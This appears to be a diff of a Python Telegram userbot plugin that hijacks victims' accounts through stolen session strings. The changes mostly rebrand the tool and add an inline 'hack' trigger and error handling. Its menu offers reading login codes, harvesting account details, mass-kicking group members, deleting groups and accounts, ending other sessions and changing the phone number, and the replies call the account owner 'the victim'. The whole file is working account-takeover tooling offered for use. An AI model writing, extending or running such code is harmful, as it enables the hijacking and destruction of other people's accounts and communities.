@@ -1,8 +1,9 @@
 
-from zthon import bot, zthon
-#By Source aljoker @huntersource
+from zthon import bot, l313l
+#By Source joker @huntersourcech
 from telethon import events, functions, types, Button
 from datetime import timedelta
+from zthon.utils import admin_cmd
 import asyncio
 from ..Config import Config
 import os, asyncio, re
@@ -19,7 +20,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
 bot = borg = tgbot
 
-Bot_Username = Config.TG_BOT_USERNAME or "rev_hak_1bot"
+Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -55,8 +56,11 @@ async def userinfo(strses):
 
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    
-    await X(rt())
+    try:
+        await X(rt())
+        return True
+    except Exception as rr:
+        return rr
 
 GROUP_LIST = []
 async def delacc(strses):
@@ -146,7 +150,7 @@ async def userchannels(strses):
     i = ""
     for x in k.chats:
       try:
-        i += f'\nCHANNEL NAME ⊙ {x.title} CHANNEL USRNAME ⊙ @{x.username}\n'
+        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
       except:
         pass
     return str(i)
@@ -159,35 +163,35 @@ logging.basicConfig(level=logging.WARNING)
 channel = "jepthon"
 menu = '''
 
-"A" :⊙ [معرفه قنوات/كروبات التي يملكها]
+"A" :~ [معرفه قنوات/كروبات التي يملكها]
 
-"B" :⊙ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
+"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-"C" :⊙ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
+"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
 
-"D" :⊙ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
+"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
 
-"E" :⊙ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
+"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
 
-"F" :⊙ [مغادره كروب /قناه عن طريق كود ترمكس]
+"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
 
-"G" :⊙][مسح كروب /قناه عن عن طريق كود ترمكس]
+"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
 
-"H" :⊙ [تاكد من التحقق بخطوتين /مفعل او لا]
+"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
 
-"I" :⊙ [انهاء جميع الجلسات ما عدا جلسة البوت]
+"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
 
-"J" :⊙ [حذف الحساب]
+"J" :~ [حذف الحساب]
 
-"K" :⊙ [حذف جميع المشرفين في كروب/قناه]
+"K" :~ [حذف جميع المشرفين في كروب/قناه]
 
-"L" ⊙ [ترقيه عضو الى مشرف داخل كروب/قناه]
+"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
 
-"M" ⊙ [تغير رقم الحساب باستخدام كود ترمكس]
+"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
 '''
 mm = '''
-قم بلأنضمام الى قناة هانتر @huntersource
+قم بلأنضمام الى قناة  هانتر @huntersourcech
 '''
 
 keyboard = [
@@ -212,21 +216,36 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس هانتر 🕷", "https://t.me/huntersource")
+    Button.url("سورس  هانتر 🤡", "https://t.me/jepthon")
     ]
 ]
-
-      
-       
-@zthon.on(
-    admin_cmd(
-       pattern="هاك$"
-    )
-)
-async def op(event):
-    joker = Bot_Username.replace("@","")       
-    await event.edit(f"**᯽︙ قم بالدخول لبوتك من هنا @{joker} \n وكتابة الامر /hack** ")
- 
+if Config.TG_BOT_USERNAME is not None and tgbot is not None:
+    @tgbot.on(events.InlineQuery)
+    async def inline_handler(event):
+        builder = event.builder
+        result = None
+        joker = Bot_Username.replace("@", "")
+        query = event.text
+        await bot.get_me()
+        if query.startswith("هاك") and event.query.user_id == bot.uid:
+            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
+            result = builder.article(
+                title="Aljoker 🤡",
+                description="اضغط على الزر لعرض الأوامر.",
+                text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
+                buttons=buttons
+            )
+        await event.answer([result] if result else None)
+@bot.on(admin_cmd(outgoing=True, pattern="هاك"))
+async def repo(event):
+    if event.fwd_from:
+        return
+    lMl10l = Config.TG_BOT_USERNAME
+    if event.reply_to_msg_id:
+        await event.get_reply_message()
+    response = await bot.inline_query(lMl10l, "هاك")
+    await response[0].click(event.chat_id)
+    await event.delete()
 @tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
@@ -254,7 +273,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/U_7h1")
+            Button.url("المطور", "https://t.me/jepthon")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -275,12 +294,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @huntersource")
+        file.write(i + "\n\nDetails BY @huntersourcech")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس هانتر ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس  هانتر ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -293,7 +312,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس هانتر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس  هانتر ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -321,7 +340,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس هانتر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس  هانتر", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -367,7 +386,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك هانتر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك  هانتر.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -396,7 +415,10 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك هانتر.", buttons=keyboard)
+      if i == True:
+      	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك  هانتر.", buttons=keyboard)
+      else:
+          await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @U_7h1\n{i}")
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -486,7 +508,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/huntersource")
+        Button.url("القناة", "https://t.me/Jepthon")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
